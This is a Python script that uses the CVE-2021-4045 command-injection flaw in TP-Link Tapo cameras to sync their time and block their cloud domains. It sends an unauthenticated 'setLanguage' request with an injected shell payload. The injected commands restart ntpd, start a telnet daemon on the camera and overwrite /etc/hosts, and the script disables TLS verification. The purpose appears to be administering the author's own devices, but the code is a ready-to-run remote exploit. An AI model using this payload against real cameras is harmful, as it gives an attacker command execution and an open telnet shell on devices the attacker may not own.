import logging
import os
from dataclasses import dataclass
from datetime import datetime
from typing import List

import pytz
import requests
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


@dataclass
class CameraConfig:
    """
    Configuration for a Tapo camera.
    """

    ip: str
    ntp_servers: List[str]
    tz: str


def get_current_date_command(camera: CameraConfig) -> str:
    """
    Generate command to set current date on camera.
    """

    now = datetime.now(tz=pytz.timezone(camera.tz))
    return f"date -s '{now.strftime('%Y-%m-%d %H:%M:%S')}'"


def generate_hosts_file_content() -> str:
    """
    Generate content for /etc/hosts file to block cloud connections.
    """

    blocked_domains = [
        "tplinkcloud.com.cn",
        "devs-ipc.tplinkcloud.com.cn",
        "n-deventry-beta.tplinkcloud.com",
        "n-deventry-dcipc.tplinkcloud.com",
        "n-device-api-beta.tplinkcloud.com",
        "n-device-api.tplinkcloud.com",
        "n-devs-beta.tplinkcloud.com",
        "n-devs-dcipc.tplinkcloud.com",
    ]

    lines = ["127.0.0.1 localhost"]
    lines.extend([f"0.0.0.0 {domain}" for domain in blocked_domains])

    return "\\n".join(lines)


def build_command_string(camera: CameraConfig) -> str:
    """
    Build the complete command string to execute on the camera.
    """

    commands = []

    # Set date command
    commands.append(get_current_date_command(camera))

    # Kill existing NTP daemon
    commands.append("killall ntpd")

    # Start NTP with specified servers
    ntp_command_parts = ["/usr/sbin/ntpd", "-d"]
    for server in camera.ntp_servers:
        ntp_command_parts.append("-p")
        ntp_command_parts.append(server)
    commands.append(" ".join(ntp_command_parts))

    # Kill existing Telnet daemon
    commands.append("killall telnetd")

    # Start Telnet daemon
    commands.append(f"/usr/sbin/telnetd -b {camera.ip}")

    # Join all commands with semicolons
    return "; ".join(commands)


def build_hosts_command() -> str:
    hosts_content = generate_hosts_file_content()
    return f"echo '{hosts_content}' > /etc/hosts"


def sync_camera(camera: CameraConfig, command: str) -> bool:
    """

    Sync time and apply settings to a Tapo camera using the CVE-2021-4045 vulnerability.

    Args:
        camera: CameraConfig object with camera settings

    Returns:
        bool: True if the request was sent successfully, False otherwise

    """

    try:
        # Build the command string
        logger.info(f"Executing command: {command}")

        # Create payload for the vulnerability
        payload = {"method": "setLanguage", "params": {"payload": f"';{command};'"}}

        # Send the request to the camera
        url = f"https://{camera.ip}:443/"
        response = requests.post(url, json=payload, verify=False, timeout=10)  # noqa: S501

        # Check if the request was successful
        if response.status_code == 200:
            logger.info(f"Successfully synced camera at {camera.ip}")
            return True

    except Exception:
        logger.exception(f"Error syncing camera at {camera.ip}")
        return False

    else:
        logger.error(f"Failed to sync camera at {camera.ip}: HTTP {response.status_code}")
        return False


def main() -> None:
    """
    Main function to sync multiple cameras using environment variables.
    """

    # Get camera IPs from environment variable
    camera_ips = os.environ["CAMERA_IPS"].split(",")
    camera_ips = [ip.strip() for ip in camera_ips if ip.strip()]

    # Get NTP servers from environment variable
    ntp_servers = os.environ["NTP_SERVERS"].split(",")
    ntp_servers = [server.strip() for server in ntp_servers if server.strip()]

    # Create camera configurations
    tz = os.getenv("TZ", "UTC")
    cameras = [CameraConfig(ip=ip, ntp_servers=ntp_servers, tz=tz) for ip in camera_ips]

    # Sync each cameras
    for camera in cameras:
        success = sync_camera(camera, build_command_string(camera))
        if not success:
            logger.error(f"Failed to sync camera at {camera.ip}")
            continue

        success = sync_camera(camera, build_hosts_command())
        if not success:
            logger.error(f"Failed to sync camera at {camera.ip}")
            continue

        logger.info(f"Camera at {camera.ip} synced successfully")


if __name__ == "__main__":
    main()
